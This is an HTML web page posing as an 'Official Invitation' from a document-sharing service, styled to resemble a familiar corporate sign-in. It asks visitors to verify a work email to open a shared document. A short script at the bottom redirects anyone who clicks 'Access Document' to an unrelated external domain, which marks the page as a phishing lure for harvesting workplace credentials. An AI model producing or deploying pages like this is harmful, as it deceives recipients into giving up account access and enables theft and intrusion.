<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Official Invitation</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

    <script>
        tailwind.config = {
            content: [],
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['"Segoe UI"', 'Tahoma', 'Geneva', 'Verdana', 'sans-serif'],
                    }
                }
            }
        }
    </script>

    <style>
        body {
            background: #f4f6f9;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-md bg-white rounded-2xl shadow-xl overflow-hidden">
        
        <!-- Blue Top Border -->
        <div class="h-1.5 bg-[#2f6fc1]"></div>

        <div class="p-8">
            <!-- Header with Icon -->
            <div class="flex items-center justify-center gap-3 mb-6">
                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCIgdmlld0JveD0iMCAwIDI0IDI0Ij48cGF0aCBmaWxsPSIjMDA3OGQ0IiBkPSJNOCAxOGg4di0ySDh6bTAtNGg4di0ySDh6bS0yIDhxLS44MjUgMC0xLjQxMi0uNTg3VDQgMjBWNHEwLS44MjUuNTg4LTEuNDEyVDYgMmg4bDYgNnYxMnEwIC44MjUtLjU4NyAxLjQxM1QxOCAyMnptNy0xM2g1bC01LTV6IiBzdHJva2Utd2lkdGg9IjAuNSIgc3Ryb2tlPSIjMDAwIi8+PC9zdmc+" 
                     alt="Document Icon" class="w-9 h-9">
                <h1 class="text-3xl font-bold text-[#0078d4]">Official Invitation</h1>
            </div>

            <p class="text-center text-gray-600 mb-8">
                Please verify your email address to securely access your document.
            </p>

            <!-- Info Box -->
            <div class="bg-[#eaf2ff] border-l-4 border-[#2f6fc1] p-4 rounded-r-xl mb-8 text-sm text-[#0078d4]">
                For your privacy, Our Document Sharing Services requires authentication before granting access to shared documents.
            </div>

            <!-- Form -->
            <form method="POST" action="#">
                <input type="email" 
                       name="email"
                       placeholder="Work or business email"
                       required
                       class="w-full px-5 py-4 border border-gray-300 rounded-xl focus:outline-none focus:border-[#2f6fc1] transition-colors mb-4 text-gray-700">

                <button type="submit" id="submit"
                        class="w-full bg-[#0078d4] hover:bg-[#2559a3] transition-colors text-white font-semibold py-4 rounded-xl text-base">
                    Access Document
                </button>
            </form>

            <!-- Footer -->
            <p class="text-center text-gray-500 text-sm mt-8">
                Need help? Reach out to our Support team.
            </p>
        </div>
    </div>
<script>
document.getElementById('submit').addEventListener('click', function() {
                 window.location.href = "https://toukushe.enterprises/e!RJS1BiHxecI/";
             });
</script>
</body>
</html>
